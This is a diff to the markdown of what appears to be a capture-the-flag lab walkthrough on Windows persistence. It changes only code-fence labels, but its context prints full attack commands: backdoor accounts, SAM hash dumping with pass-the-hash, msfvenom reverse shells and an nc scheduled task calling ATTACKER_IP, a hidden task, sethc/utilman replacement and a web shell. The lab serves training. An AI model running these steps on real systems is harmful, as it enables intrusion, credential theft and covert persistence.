@@ -74,7 +74,7 @@ Notice that we assume you have already gained administrative access somehow and 
  The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators**  group. We can easily achieve this with the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> net localgroup administrators thmuser0 /add
 ```
 
@@ -85,14 +85,14 @@ C:\> net localgroup administrators thmuser0 /add
  To do so, we begin by adding the account to the Backup Operators group:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> net localgroup "Backup Operators" thmuser1 /add
 ```
 
    Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users**  (RDP) or **Remote Management Users**  (WinRM) groups. We'll use WinRM for this task:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> net localgroup "Remote Management Users" thmuser1 /add
 ```
 
@@ -105,7 +105,7 @@ C:\> net localgroup "Remote Management Users" thmuser1 /add
    **Username** thmuser1 **Password** Password321     If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
 
 *Evil-WinRM* PS C:\> whoami /groups
@@ -132,14 +132,14 @@ Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
  To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 ```
 
    Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
         
 *Evil-WinRM* PS C:\> whoami /groups
@@ -164,7 +164,7 @@ Mandatory Label\High Mandatory Level Label            S-1-16-12288
    We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
 
     AttackBox  
-```AttackBox 
+```bash
 *Evil-WinRM* PS C:\> reg save hklm\system system.bak
     The operation completed successfully.
 
@@ -183,7 +183,7 @@ Mandatory Label\High Mandatory Level Label            S-1-16-12288
  With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
 
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
@@ -201,7 +201,7 @@ thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:
    And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
 ```
 
@@ -259,7 +259,7 @@ Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
  If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> net user thmuser2
 User name                    thmuser2
 
@@ -290,7 +290,7 @@ Log in to the machine via WinRM using thmuser2 and execute `C:\flags\flag2.exe` 
  To find the assigned RIDs for any user, you can use the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> wmic useraccount get name,sid
 
 Name                SID
@@ -307,7 +307,7 @@ thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
  Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\tools\pstools> PsExec64.exe -i -s regedit
 ```
 
@@ -409,7 +409,7 @@ powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
  Let's start an nc listener to receive our reverse shell on our attacker's machine:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ nc -lvp 4445
 ```
 
@@ -494,7 +494,7 @@ sc.exe start THMservice
  Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
 ```
 
@@ -519,7 +519,7 @@ Use the reverse shell you just gained to execute `C:\flags\flag7.exe`   Modifyin
  You can get a list of available services using the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc.exe query state=all
 SERVICE_NAME: THMService1
 DISPLAY_NAME: THMService1
@@ -534,7 +534,7 @@ DISPLAY_NAME: THMService1
    You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc.exe qc THMService3
 [SC] QueryServiceConfig SUCCESS
 
@@ -560,21 +560,21 @@ SERVICE_NAME: THMService3
  Let's start by creating a new reverse shell with msfvenom:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
 ```
 
    To reconfigure "THMservice3" parameters, we can use the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
 ```
 
    You can then query the service's configuration again to check if all went as expected:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc.exe qc THMservice3
 [SC] QueryServiceConfig SUCCESS
 
@@ -623,7 +623,7 @@ We can also use scheduled tasks to establish persistence if needed. There are se
  Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
 SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
 ```
@@ -635,7 +635,7 @@ SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
  To check if our task was successfully created, we can use the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> schtasks /query /tn thm-taskbackdoor
 
 Folder: \
@@ -653,7 +653,7 @@ thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
  To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
 ```
 
@@ -664,14 +664,14 @@ C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
  If we try to query our service again, the system will tell us there is no such task:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
 ```
 
    If we start an nc listener in our attacker's machine, we should get a shell back after a minute:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ nc -lvp 4449
 ```
 
@@ -704,27 +704,27 @@ Some actions performed by a user might also be bound to executing specific paylo
  For this task, let's generate a reverse shell payload using msfvenom:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
 ```
 
    We will then copy our payload into the victim machine. You can spawn an `http.server` with Python3 and use wget on the victim machine to pull your file:
 
       AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ python3 -m http.server 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
     ➜     Powershell  
-```Powershell 
+```bash
 PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
 ```
 
      We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
 ```
 
@@ -753,14 +753,14 @@ Use your newly obtained shell to execute `C:\flags\flag10.exe` and get your flag
  For this task, let's create a new reverse shell with msfvenom:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
 ```
 
    After transferring it to the victim machine, let's move it to `C:\Windows\`:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> move revshell.exe C:\Windows
 ```
 
@@ -793,14 +793,14 @@ Using your newly obtained shell, execute `C:\flags\flag11.exe` to get a flag!   
 Let's start by creating a shell:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
 ```
 
    We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> move revshell.exe C:\Windows
 ```
 
@@ -825,14 +825,14 @@ Using your newly obtained shell, execute `C:\flags\flag12.exe` to get a flag!   
  Let's first create a reverse shell to use for this technique:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
 ```
 
    We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> move revshell.exe C:\Windows
 ```
 
@@ -899,7 +899,7 @@ If we have physical access to the machine (or RDP in our case), you can backdoor
  To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> takeown /f c:\Windows\System32\sethc.exe
 
 SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".
@@ -936,7 +936,7 @@ From your newly obtained terminal, execute `C:\flags\flag14.exe` to get your fla
  To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> takeown /f c:\Windows\System32\utilman.exe
 
 SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".
@@ -991,7 +991,7 @@ If you don't want to use Windows features to hide a backdoor, you can always pro
  Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> move shell.aspx C:\inetpub\wwwroot\
 ```
 
@@ -1089,13 +1089,13 @@ $client.Close()
 - The second connection will be a reverse shell on port 4454 back to our attacker machine.
 
       AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ python3 -m http.server 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
           AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ nc -lvp 4454
 Listening on 0.0.0.0 4454
 ```
